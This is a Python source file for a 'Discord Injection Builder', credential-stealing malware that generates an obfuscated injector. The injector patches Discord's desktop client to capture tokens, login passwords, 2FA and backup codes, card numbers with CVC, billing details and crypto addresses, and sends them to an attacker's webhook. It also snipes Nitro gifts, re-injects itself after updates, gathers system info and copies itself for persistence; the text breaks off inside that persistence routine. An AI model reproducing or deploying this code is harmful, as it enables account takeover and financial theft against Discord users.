# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import base64
    import os
    import subprocess
    import sys
    import tkinter as tk
    from tkinter import filedialog
    try:
        from PIL import Image
        PIL_AVAILABLE = True
    except ImportError:
        PIL_AVAILABLE = False
except Exception as e:
    MissingModule(e)

Title("Discord Injection Builder")
Connection()
CheckGithubStar()

def encode_webhook(webhook_url):
    parts = webhook_url.replace("https://discord.com/api/webhooks/", "").split("/")
    webhook_id = parts[0]
    webhook_token = parts[1]
    part1 = base64.b64encode("https://discord.com/api/webhooks/".encode()).decode()
    part2 = base64.b64encode(webhook_id.encode()).decode()
    part3 = base64.b64encode(webhook_token.encode()).decode()
    return part1, part2, part3

def validate_webhook_format(url):
    if not url.startswith("https://discord.com/api/webhooks/"):
        return False
    parts = url.replace("https://discord.com/api/webhooks/", "").split("/")
    if len(parts) != 2 or not parts[0].isdigit() or len(parts[1]) < 10:
        return False
    return True

try:
    webhook = ChoiceWebhook()
    if not validate_webhook_format(webhook):
        print(f"{ERROR} Webhook URL format is invalid!", reset)
        Continue()
        Reset()

    part1, part2, part3 = encode_webhook(webhook)

    print()
    filename = input(f"{INPUT} File Name {red}->{reset} ").strip()
    if not filename:
        ErrorInput()
    filename = "".join(c for c in filename if c.isalnum() or c in "-_ ")
    if not filename:
        ErrorInput()

    Scroll(f"""
{PREFIX}01{SUFFIX}{white} Python File
{PREFIX}02{SUFFIX}{white} Executable File""")

    file_type = input(f"\n{INPUT} File Type {red}->{reset} ").strip().lstrip("0")

    if file_type not in ["1", "2"]:
        ErrorChoice()

    Scroll(f"""
{PREFIX}01{SUFFIX}{white} With Console
{PREFIX}02{SUFFIX}{white} No Console""")

    console_choice = input(f"\n{INPUT} Console Type {red}->{reset} ").strip().lstrip("0")

    if console_choice not in ["1", "2"]:
        ErrorChoice()

    noconsole = console_choice == "2"
    icon_path = None
    temp_icon = False

    if file_type == "1":
        extension = ".pyw" if noconsole else ".py"
    else:
        extension = ".exe"

        icon_choice = input(f"\n{INPUT} Add an Icon? {YESORNO} {red}->{reset} ").strip().lower()

        if icon_choice in ["y", "yes"]:
            print(f"{INPUT} Select an Icon {red}->", reset)
            root = tk.Tk()
            root.withdraw()
            root.wm_attributes('-topmost', 1)
            icon_path = filedialog.askopenfilename(
                title="Select Icon File",
                filetypes=[("Image files", "*.ico *.png"), ("All files", "*.*")]
            )
            root.destroy()

            if icon_path:
                if icon_path.lower().endswith('.png'):
                    if not PIL_AVAILABLE:
                        print(f"{LOADING} Installing Pillow for icon conversion..", reset)
                        try:
                            subprocess.run([sys.executable, "-m", "pip", "install", "pillow"], check=True, capture_output=True)
                            from PIL import Image
                            print(f"{SUCCESS} Pillow installed!", reset)
                        except Exception as pil_error:
                            print(f"{ERROR} Failed to install Pillow:{red} {pil_error}", reset)
                            print(f"{INFO} Icon will not be used.", reset)
                            icon_path = None

                    if icon_path:
                        print(f"{LOADING} Converting PNG to ICO..", reset)
                        try:
                            from PIL import Image
                            img = Image.open(icon_path)
                            ico_path = os.path.join(os.path.dirname(icon_path), os.path.splitext(os.path.basename(icon_path))[0] + ".ico")
                            img.save(ico_path, format='ICO', sizes=[(256, 256)])
                            icon_path = ico_path
                            temp_icon = True
                            print(f"{SUCCESS} Icon converted:{red} {os.path.basename(icon_path)}", reset)
                        except Exception as e:
                            print(f"{ERROR} Failed to convert icon:{red} {e}", reset)
                            icon_path = None
                else:
                    print(f"{SUCCESS} Icon selected:{red} {os.path.basename(icon_path)}", reset)
            else:
                print(f"{INFO} No icon selected.", reset)

    print(f"\n{LOADING} Generating Discord Injector File..", reset)

    Code_template = r'''# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details
import os as _0x1a2b3c
import sys as _0x4d5e6f
import base64 as _0x5m6n7o
import shutil as _0x8p9q0r
import requests as _0x3s4t5u
from datetime import datetime as _0x6v7w8x

_0x9y0z1a = "{part1}"
_0x2b3c4d = "{part2}"
_0x5e6f7g = "{part3}"

def _0xDecode():
    _p1 = _0x5m6n7o.b64decode(_0x9y0z1a).decode()
    _p2 = _0x5m6n7o.b64decode(_0x2b3c4d).decode()
    _p3 = _0x5m6n7o.b64decode(_0x5e6f7g).decode()
    return _p1 + _p2 + "/" + _p3

_0xURL = _0xDecode()

def _0xVerifyWebhook():
    import time as _0xTm
    for _ in range(3):
        try:
            _r = _0x3s4t5u.get(_0xURL, timeout=5)
            if _r.status_code in [200, 204]:
                return True
            if _r.status_code == 429:
                _0xTm.sleep(2)
                continue
        except Exception:
            pass
    return False

_INJECTION_CODE = ("const _0xW='" + _0xURL + "';"
    + "const _0xAv='https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png';"
    + "(function(){try{"
    + "var e=require('electron'),h=require('https'),U=require('url'),qs=require('querystring'),fs=require('fs'),pt=require('path');"
    + "function wSend(p){try{"
    + "var d=typeof p==='string'?p:JSON.stringify(p);"
    + "var u=new U.URL(_0xW);var r=h.request({hostname:u.hostname,path:u.pathname,method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(d)}});r.on('error',function(){});r.write(d);r.end()"
    + "}catch(x){}}"
    + "function apiReq(ru,hd){return new Promise(function(ok,no){"
    + "var u=new U.URL(ru);"
    + "var req=h.request({hostname:u.hostname,path:u.pathname+(u.search||''),method:'GET',headers:hd||{}});"
    + "req.end();"
    + "req.on('response',function(res){var b='';res.on('data',function(c){b+=c});res.on('end',function(){ok(b)})});"
    + "req.on('error',function(er){no(er)})"
    + "})}"
    + "function execJS(s){var w=e.BrowserWindow.getAllWindows()[0];if(!w||w.isDestroyed())return Promise.resolve(null);return w.webContents.executeJavaScript(s,true)}"
    + "function getToken(){return execJS(\"(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\").catch(function(){return null})}"
    + "function fetchAPI(ep,tk){return apiReq('https://discord.com/api/v9/users/@me'+ep,{'Authorization':tk}).then(function(d){return JSON.parse(d)}).catch(function(){return null})}"
    + "function ni(t){var n={0:'None',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'};return n[t]||'None'}"
    + "function bg(f){if(!f)return 'None';var b=[],fl={1:'Staff',2:'Partner',4:'HypeSquad Events',8:'Bug Hunter Lv1',64:'HypeSquad Bravery',128:'HypeSquad Brilliance',256:'HypeSquad Balance',512:'Early Supporter',16384:'Bug Hunter Lv2',131072:'Verified Bot Dev',4194304:'Active Developer'};for(var k in fl){if(f&parseInt(k))b.push(fl[k])}return b.length?b.join(', '):'None'}"
    + "function au(x){return x.avatar?'https://cdn.discordapp.com/avatars/'+x.id+'/'+x.avatar+(x.avatar.startsWith('a_')?'.gif':'.png'):'https://cdn.discordapp.com/embed/avatars/'+((parseInt(x.id)>>22)%6)+'.png'}"
    + "function pm(a){if(!a||!a.length)return 'None';var r=[];for(var i=0;i<a.length;i++){var s=a[i];if(s.type===1)r.push('Credit Card (*'+(s.last_4||'????')+')');else if(s.type===2)r.push('PayPal ('+(s.email||'N/A')+')');else r.push('Other (type '+s.type+')')}return r.join(', ')}"
    + "function fi(x){return 'Username : '+x.username+'\\nDisplay  : '+(x.global_name||'N/A')+'\\nUser Id  : '+x.id+'\\nEmail    : '+(x.email||'N/A')+'\\nPhone    : '+(x.phone||'None')+'\\nMFA      : '+(x.mfa_enabled?'Enabled':'Disabled')+'\\nNitro    : '+ni(x.premium_type)+'\\nLocale   : '+(x.locale||'N/A')+'\\nVerified : '+(x.verified?'Yes':'No')+'\\nBadges   : '+bg(x.public_flags)}"
    + "function gfr(a){if(!a||!a.length)return 'None';var n=[];for(var i=0;i<Math.min(a.length,5);i++)n.push(a[i].user.username);return n.join(', ')+(a.length>5?' (+'+(a.length-5)+' more)':'')}"
    + "function gsv(a){if(!a||!a.length)return 'None';a.sort(function(x,y){return(y.approximate_member_count||0)-(x.approximate_member_count||0)});var n=[];for(var i=0;i<Math.min(a.length,5);i++)n.push(a[i].name+' ('+(a[i].approximate_member_count||'?')+' members)');return n.join('\\n')+(a.length>5?'\\n(+'+(a.length-5)+' more)':'')}"
    + "async function capToken(tk,src){"
    + "var ac=await fetchAPI('',tk);if(!ac||!ac.id)return;"
    + "var bil=await fetchAPI('/billing/payment-sources',tk);"
    + "var fr=await fetchAPI('/relationships',tk);"
    + "var gu=await fetchAPI('/guilds?with_counts=true',tk);"
    + "var fields=[{name:'👤 User Information',value:'```'+fi(ac)+'```',inline:false},{name:'🔐 Token',value:'```'+tk+'```',inline:false},{name:'Source',value:'```'+src+'```',inline:true},{name:'Client',value:'```Desktop```',inline:true}];"
    + "if(bil&&bil.length)fields.push({name:'Payment Methods',value:'```'+pm(bil)+'```',inline:false});"
    + "var fc=fr?fr.length:0;fields.push({name:'Friends ('+fc+')',value:'```'+gfr(fr)+'```',inline:false});"
    + "var gc=gu?gu.length:0;fields.push({name:'Servers ('+gc+')',value:'```'+gsv(gu)+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔐 Token Captured!',color:3066993,thumbnail:{url:au(ac)},fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function nc(title,old,val,tk,un,uid){"
    + "if(!old||old==='null'||old==='undefined')old='None';if(!val||val==='null'||val==='undefined')val='None';"
    + "var fields=[{name:'Changed',value:'```'+title+'```',inline:true},{name:'Before',value:'```'+old+'```',inline:true},{name:'After',value:'```'+val+'```',inline:true}];"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "if(un)fields.push({name:'User',value:'```'+un+' ('+uid+')```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'👤 Account Updated!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function logcap(em,pw,tk){"
    + "var fields=[{name:'Email',value:'```'+em+'```',inline:true},{name:'Password',value:'```'+pw+'```',inline:true}];"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔑 Login Credentials!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function mfacap(code,type,tk){"
    + "var fields=[{name:'Code',value:'```'+code+'```',inline:true},{name:'Type',value:'```'+type+'```',inline:true}];"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔒 2FA Code Used!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function bkcap(codes,tk){"
    + "var fc=codes.filter(function(c){return!c.consumed});var msg='';"
    + "for(var i=0;i<fc.length;i++)msg+=fc[i].code.substr(0,4)+'-'+fc[i].code.substr(4)+'\\n';"
    + "var fields=[{name:'Backup Codes',value:'```'+(msg||'None')+'```',inline:false}];"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'📋 Backup Codes Viewed!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function cccap(num,cvc,mo,yr,tk){"
    + "var fields=[{name:'Number',value:'```'+num+'```',inline:true},{name:'CVC',value:'```'+cvc+'```',inline:true},{name:'Expiry',value:'```'+mo+'/'+yr+'```',inline:true}];"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'💳 Credit Card Added!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}"
    + "function ngSnipe(code,tk){try{"
    + "var body=JSON.stringify({channel_id:null,payment_source_id:null});"
    + "var u=new U.URL('https://discord.com/api/v9/entitlements/gift-codes/'+code+'/redeem');"
    + "var req=h.request({hostname:u.hostname,path:u.pathname,method:'POST',headers:{'Authorization':tk,'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}});"
    + "req.on('response',function(res){var b='';res.on('data',function(c){b+=c});res.on('end',function(){try{"
    + "var st=res.statusCode===200?'Claimed!':'Failed ('+res.statusCode+')';"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🎁 Nitro Gift Sniped!',color:3066993,fields:[{name:'Code',value:'```'+code+'```',inline:true},{name:'Status',value:'```'+st+'```',inline:true},{name:'🔐 Token',value:'```'+tk+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}catch(x){}})});req.on('error',function(){});req.write(body);req.end()}catch(x){}}"
    + "function ppcap(rd,tk){try{"
    + "var type=rd.type===1?'Credit Card':rd.type===2?'PayPal':rd.type===3?'Venmo':'Other ('+rd.type+')';"
    + "var fields=[{name:'Type',value:'```'+type+'```',inline:true}];"
    + "if(rd.type===2&&rd.email)fields.push({name:'PayPal Email',value:'```'+rd.email+'```',inline:true});"
    + "if(rd.billing_address){var ba=rd.billing_address;var addr=[ba.name,ba.line_1,ba.line_2,ba.city,ba.state,ba.postal_code,ba.country].filter(Boolean).join(', ');fields.push({name:'Billing Address',value:'```'+addr+'```',inline:false})}"
    + "if(tk)fields.push({name:'🔐 Token',value:'```'+tk+'```',inline:false});"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'💰 Payment Method Added!',color:3066993,fields:fields,footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}catch(x){}}"
    + "var _cxRe=/(?:^|\\s)((?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|0x[a-fA-F0-9]{40}|[1-9A-HJ-NP-Za-km-z]{32,44}|T[A-Za-z1-9]{33}|r[0-9a-zA-Z]{24,34}|X[1-9A-HJ-NP-Za-km-z]{25,34}|D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{24,}|ltc1[a-z0-9]{39,59}|L[a-km-zA-HJ-NP-Z1-9]{26,33}|cash[a-z0-9]{42}|bnb1[a-z0-9]{38})(?:$|\\s)/;"
    + "var _cxNames={'bc1':'BTC (Bech32)','1':'BTC','3':'BTC (P2SH)','0x':'ETH/BSC','T':'TRX','r':'XRP','X':'XMR','D':'DOGE','ltc1':'LTC (Bech32)','L':'LTC','cash':'BCH','bnb1':'BNB'};"
    + "function cxType(a){for(var p in _cxNames){if(a.startsWith(p))return _cxNames[p]}return 'Unknown'}"
    + "function cxcap(addr,ctx,tk){try{"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🪙 Crypto Wallet Detected!',color:3066993,fields:[{name:'Type',value:'```'+cxType(addr)+'```',inline:true},{name:'Address',value:'```'+addr+'```',inline:false},{name:'Context',value:'```'+ctx+'```',inline:false},{name:'🔐 Token',value:'```'+(tk||'N/A')+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})"
    + "}catch(x){}}"
    + "var _lastTk=null;"
    + "var _em='',_pw='',_ini=false,_prev=null;"
    + "function createWindow(){"
    + "var mw=e.BrowserWindow.getAllWindows()[0];"
    + "if(!mw){setTimeout(createWindow,1000);return}"
    + "try{mw.webContents.debugger.attach('1.3')}catch(x){}"
    + "mw.webContents.debugger.on('message',async function(_,mt,pr){"
    + "if(!_ini){_ini=true;try{var tk=await getToken();if(tk){_lastTk=tk;await capToken(tk,'Injection');_prev=await fetchAPI('',tk)}}catch(x){}}"
    + "if(mt==='Network.webSocketFrameReceived'){try{var pd=JSON.parse(pr.response.payloadData);"
    + "if(pd.t==='MESSAGE_CREATE'&&pd.d&&pd.d.content){var gm=pd.d.content.match(/discord(?:\\.gift|(?:app)?\\.com\\/gifts)\\/([a-zA-Z0-9]+)/);if(gm){var tk=await getToken();if(tk)ngSnipe(gm[1],tk)}"
    + "var cx=pd.d.content.match(_cxRe);if(cx){var tk=await getToken();cxcap(cx[1].trim(),'Message from '+((pd.d.author&&pd.d.author.username)||'Unknown')+' in '+(pd.d.guild_id?'server':'DM'),tk)}}"
    + "if(pd.t==='READY'&&pd.d&&pd.d.user){var tk=await getToken();if(tk&&(!_prev||pd.d.user.id!==_prev.id)){wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔔 New Session Detected!',color:3066993,fields:[{name:'User',value:'```'+pd.d.user.username+' ('+pd.d.user.id+')```',inline:false},{name:'🔐 Token',value:'```'+tk+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]});capToken(tk,'QR Code / New Session');_prev=await fetchAPI('',tk)}}"
    + "if(pd.t==='USER_SETTINGS_PROTO_UPDATE'||pd.t==='USER_PREMIUM_GUILD_SUBSCRIPTION_SLOT_UPDATE'){var tk=await getToken();if(tk){var ac=await fetchAPI('',tk);if(ac&&ac.premium_type&&_prev&&ac.premium_type!==_prev.premium_type){wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'✨ Nitro Status Changed!',color:3066993,fields:[{name:'Before',value:'```'+ni(_prev.premium_type)+'```',inline:true},{name:'After',value:'```'+ni(ac.premium_type)+'```',inline:true},{name:'User',value:'```'+ac.username+' ('+ac.id+')```',inline:false},{name:'🔐 Token',value:'```'+tk+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]});_prev=ac}}}"
    + "}catch(x){};return}"
    + "if(mt!=='Network.responseReceived')return;"
    + "var ru=pr.response.url;"
    + "if(!['/auth/login','/auth/register','/mfa/totp','/mfa/codes-verification','/users/@me','/billing/payment-sources','/auth/verify'].some(function(f){return ru.endsWith(f)}))return;"
    + "if([200,202].indexOf(pr.response.status)===-1)return;"
    + "try{"
    + "var rb=await mw.webContents.debugger.sendCommand('Network.getResponseBody',{requestId:pr.requestId});"
    + "var rd=JSON.parse(rb.body);"
    + "var qd=null;try{var qb=await mw.webContents.debugger.sendCommand('Network.getRequestPostData',{requestId:pr.requestId});qd=JSON.parse(qb.postData)}catch(qe){}"
    + "if(ru.endsWith('/auth/login')){"
    + "if(!qd)return;if(!rd.token){_em=qd.login;_pw=qd.password;return}"
    + "logcap(qd.login,qd.password,rd.token);capToken(rd.token,'Login')"
    + "}else if(ru.endsWith('/auth/register')){"
    + "if(!qd)return;logcap(qd.email,qd.password,rd.token);capToken(rd.token,'Register')"
    + "}else if(ru.endsWith('/mfa/totp')){"
    + "if(!qd)return;logcap(_em,_pw,rd.token);mfacap(qd.code,'TOTP',rd.token);capToken(rd.token,'Login (2FA)')"
    + "}else if(ru.endsWith('/codes-verification')){"
    + "var tk=await getToken();if(rd.backup_codes)bkcap(rd.backup_codes,tk)"
    + "}else if(ru.endsWith('/@me')){"
    + "if(!qd||!qd.password)return;"
    + "var tk=rd.token||await getToken();"
    + "if(qd.email&&_prev&&qd.email!==_prev.email)nc('Email',_prev.email,qd.email,tk,_prev.username,_prev.id);"
    + "if(qd.new_password)nc('Password',qd.password,qd.new_password,tk,_prev?_prev.username:'',_prev?_prev.id:'');"
    + "if(rd.token&&rd.token!==_lastTk){_lastTk=rd.token;wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔄 Token Regenerated!',color:3066993,fields:[{name:'🔐 New Token',value:'```'+rd.token+'```',inline:false},{name:'Reason',value:'```Account settings changed (email/password)```',inline:false},{name:'User',value:'```'+(_prev?_prev.username:'Unknown')+' ('+(_prev?_prev.id:'N/A')+')```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})}"
    + "if(tk)_prev=await fetchAPI('',tk)"
    + "}else if(ru.endsWith('/billing/payment-sources')){"
    + "if(!Array.isArray(rd)){var tk=await getToken();ppcap(rd,tk)}"
    + "}else if(ru.endsWith('/auth/verify')){"
    + "var ntk=rd.token||null;var vtk=qd&&qd.token?qd.token:'N/A';"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'✉️ Email Verified!',color:3066993,fields:[{name:'🔐 Verification Token',value:'```'+vtk+'```',inline:false},{name:'🔐 New Auth Token',value:'```'+(ntk||'Same as before')+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]});"
    + "if(ntk){_lastTk=ntk;capToken(ntk,'Email Verification')}"
    + "}"
    + "}catch(x){}});"
    + "try{mw.webContents.debugger.sendCommand('Network.enable')}catch(x){}"
    + "try{mw.webContents.on('devtools-opened',async function(){var tk=await getToken();wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'⚠️ DevTools Opened!',color:3066993,fields:[{name:'Warning',value:'```User opened Developer Tools```',inline:false},{name:'🔐 Token',value:'```'+(tk||'N/A')+'```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})})}catch(x){}"
    + "mw.on('closed',function(){_ini=false;setTimeout(createWindow,1000)})"
    + "}"
    + "function setupSession(){"
    + "try{e.session.defaultSession.webRequest.onCompleted({urls:['https://api.stripe.com/v*/tokens']},async function(det){"
    + "if([200,202].indexOf(det.statusCode)===-1||det.method!=='POST')return;"
    + "try{var it=qs.parse(Buffer.from(det.uploadData[0].bytes).toString());"
    + "var tk=await getToken();cccap(it['card[number]'],it['card[cvc]'],it['card[exp_month]'],it['card[exp_year]'],tk)}catch(x){}"
    + "})}catch(x){}"
    + "}"
    + "function setupProtection(){try{"
    + "var mp=pt.resolve(__dirname,'index.js');"
    + "var full=fs.readFileSync(mp,'utf-8');"
    + "fs.watchFile(mp,{interval:5000},function(){try{"
    + "var c=fs.readFileSync(mp,'utf-8');"
    + "if(c.indexOf('_0xW')===-1){fs.writeFileSync(mp,full);"
    + "wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🛡️ Update Protection!',color:3066993,fields:[{name:'Status',value:'```Discord update detected - Re-injected successfully```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]})}"
    + "}catch(x){}})}"
    + "catch(x){}}"
    + "function setupRotation(){setInterval(async function(){try{var tk=await getToken();if(tk&&tk!==_lastTk){_lastTk=tk;wSend({username:'Buildware 1nj3ct10n',avatar_url:_0xAv,embeds:[{title:'🔃 Token Rotated!',color:3066993,fields:[{name:'🔐 New Token',value:'```'+tk+'```',inline:false},{name:'Detection',value:'```Periodic check (5min interval)```',inline:false}],footer:{text:'Buildware 1nj3ct10n',icon_url:_0xAv},timestamp:new Date().toISOString()}]});capToken(tk,'Token Rotation')}}catch(x){}},300000)}"
    + "if(e.app.isReady()){setTimeout(createWindow,3000);setupSession();setupProtection();setupRotation()}else{e.app.on('ready',function(){setTimeout(createWindow,3000);setupSession();setupProtection();setupRotation()})}"
    + "}catch(e){}})();\n")

_PATHS = {
    'Discord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'Discord'),
    'Discord PTB': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordPTB'),
    'Discord Canary': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordCanary'),
    'Discord Development': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordDevelopment'),
    'Lightcord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('APPDATA', ''), 'Lightcord'),
    'Discord (Scoop)': _0x1a2b3c.path.join(_0x1a2b3c.getenv('USERPROFILE', ''), 'scoop', 'apps', 'discord', 'current'),
    'BetterDiscord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('APPDATA', ''), 'BetterDiscord')
}

_DISCORD_PROCESSES = ['Discord.exe', 'DiscordPTB.exe', 'DiscordCanary.exe', 'DiscordDevelopment.exe', 'Lightcord.exe']

def _0xKill_Discord():
    import subprocess as _0x9s8t7u
    _0xKilled = []
    for _0xProc in _DISCORD_PROCESSES:
        try:
            _r = _0x9s8t7u.run(
                ['taskkill', '/F', '/IM', _0xProc],
                capture_output=True, text=True, creationflags=0x08000000
            )
            if _r.returncode == 0:
                _0xKilled.append(_0xProc.replace('.exe', ''))
        except Exception:
            pass
    return _0xKilled

def _0xFind_Discord_Modules(_0xPath):
    _0xModules = []
    try:
        for _0xEntry in sorted(_0x1a2b3c.listdir(_0xPath), reverse=True):
            if not _0xEntry.startswith('app'):
                continue
            _0xApp_Path = _0x1a2b3c.path.join(_0xPath, _0xEntry)
            if not _0x1a2b3c.path.isdir(_0xApp_Path):
                continue
            _0xModules_Dir = _0x1a2b3c.path.join(_0xApp_Path, 'modules')
            if not _0x1a2b3c.path.exists(_0xModules_Dir):
                continue
            for _0xMod in _0x1a2b3c.listdir(_0xModules_Dir):
                if _0xMod.startswith('discord_desktop_core'):
                    _0xCore = _0x1a2b3c.path.join(_0xModules_Dir, _0xMod, 'discord_desktop_core')
                    if _0x1a2b3c.path.exists(_0xCore):
                        _0xModules.append(_0xCore)
    except PermissionError:
        pass
    except Exception:
        pass
    return _0xModules

def _0xValidate_Index(_0xContent):
    if 'module.exports' not in _0xContent:
        return False
    if 'core.asar' not in _0xContent:
        return False
    return True

def _0xInject_Code(_0xModule_Path):
    _0xIndex_File = _0x1a2b3c.path.join(_0xModule_Path, 'index.js')
    try:
        if not _0x1a2b3c.path.exists(_0xIndex_File):
            return 'missing'
        with open(_0xIndex_File, 'r', encoding='utf-8', errors='ignore') as _0xF:
            _0xContent = _0xF.read()
        _0xBackup = _0x1a2b3c.path.join(_0xModule_Path, 'index.js.bak')
        if '_0xW' in _0xContent:
            if _0x1a2b3c.path.exists(_0xBackup):
                with open(_0xBackup, 'r', encoding='utf-8', errors='ignore') as _0xF:
                    _0xContent = _0xF.read()
            else:
                _0xIdx = _0xContent.find('module.exports')
                if _0xIdx != -1:
                    _0xContent = _0xContent[_0xIdx:]
                else:
                    return 'invalid'
        if not _0xValidate_Index(_0xContent):
            return 'invalid'
        if not _0x1a2b3c.path.exists(_0xBackup):
            _0x8p9q0r.copy2(_0xIndex_File, _0xBackup)
        _0xExport_Idx = _0xContent.find('module.exports')
        _0xNew = _0xContent[:_0xExport_Idx] + _INJECTION_CODE + _0xContent[_0xExport_Idx:]
        with open(_0xIndex_File, 'w', encoding='utf-8') as _0xF:
            _0xF.write(_0xNew)
        with open(_0xIndex_File, 'r', encoding='utf-8') as _0xF:
            _0xVerify = _0xF.read()
        if 'module.exports' not in _0xVerify or '_0xW' not in _0xVerify:
            _0x8p9q0r.copy2(_0xBackup, _0xIndex_File)
            return 'verify_fail'
        return 'success'
    except PermissionError:
        return 'permission'
    except Exception:
        try:
            _0xBackup = _0x1a2b3c.path.join(_0xModule_Path, 'index.js.bak')
            if _0x1a2b3c.path.exists(_0xBackup):
                _0x8p9q0r.copy2(_0xBackup, _0xIndex_File)
        except Exception:
            pass
        return 'error'

def _0xRestart_Discord():
    import subprocess as _0xSP
    _0xStarted = []
    _0xPaths = {
        'Discord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'Discord'),
        'DiscordPTB': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordPTB'),
        'DiscordCanary': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordCanary'),
        'DiscordDevelopment': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordDevelopment'),
    }
    for _0xN, _0xP in _0xPaths.items():
        _0xExe = _0x1a2b3c.path.join(_0xP, 'Update.exe')
        if _0x1a2b3c.path.exists(_0xExe):
            try:
                _0xSP.Popen(
                    [_0xExe, '--processStart', _0xN + '.exe'],
                    creationflags=0x08000000
                )
                _0xStarted.append(_0xN)
            except Exception:
                continue
    return _0xStarted

def _0xGet_System_Info():
    import platform as _0xPlat
    import socket as _0xSock
    info = {}
    try:
        info['computer'] = _0xSock.gethostname()
        info['username'] = _0x1a2b3c.getlogin()
        info['os'] = _0xPlat.system() + ' ' + _0xPlat.release() + ' ' + _0xPlat.architecture()[0]
    except Exception:
        info['computer'] = 'N/A'
        info['username'] = 'N/A'
        info['os'] = 'N/A'
    try:
        info['ip'] = _0x3s4t5u.get('https://api.ipify.org', timeout=5).text
    except Exception:
        info['ip'] = 'N/A'
    return info

def _0xPersist():
    try:
        import winreg as _0xWR
        _0xSrc = _0x1a2b3c.path.abspath(_0x4d5e6f.argv[0])
        _0xExt = _0x1a2b3c.path.splitext(_0xSrc)[1]
        _0xDstDir = _0x1a2b3c.path.join(_0x1a2b3c.getenv('APPDATA', ''), 'Microsoft')
        _0x1a2b3c.makedirs(_0xDstDir, exist_ok=True)
        _0xDst = _0x1a2b3c.path.join(_0xDstDir, 'DiscordUpdate' + _0xExt)
        if not _0x1a2b3c.path.exists(_0xDst) or _0x1a2b3c.path.getsize(_0xDst) != _0x1a2b3c.path.getsize(_0xSrc):
            _0x8p9q0r.copy2(_0xSrc, _0xDst)
